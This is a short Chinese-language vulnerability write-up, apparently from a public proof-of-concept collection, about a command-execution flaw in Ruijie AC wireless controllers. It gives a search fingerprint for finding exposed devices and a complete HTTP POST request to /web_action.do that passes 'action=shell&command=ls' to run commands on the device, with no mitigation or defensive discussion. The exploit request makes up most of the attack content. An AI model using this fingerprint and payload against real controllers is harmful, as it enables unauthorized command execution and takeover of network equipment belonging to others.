# 锐捷AC无线控制器存在命令执行漏洞

**一、漏洞简介**  
<font style="color:rgb(34, 34, 34);">锐捷AC无线控制器存在命令执行漏洞，攻击者可通过该漏洞执行任意命令</font>  
**二、影响版本**

锐捷AC无线控制器

**三、资产测绘**

```plain
web.body="简网络，玩智分，无线移动体验 "
```

●登录


**四、漏洞复现**

```plain
POST /web_action.do HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

action=shell&command=ls
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fivwdfbv0bacamon>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
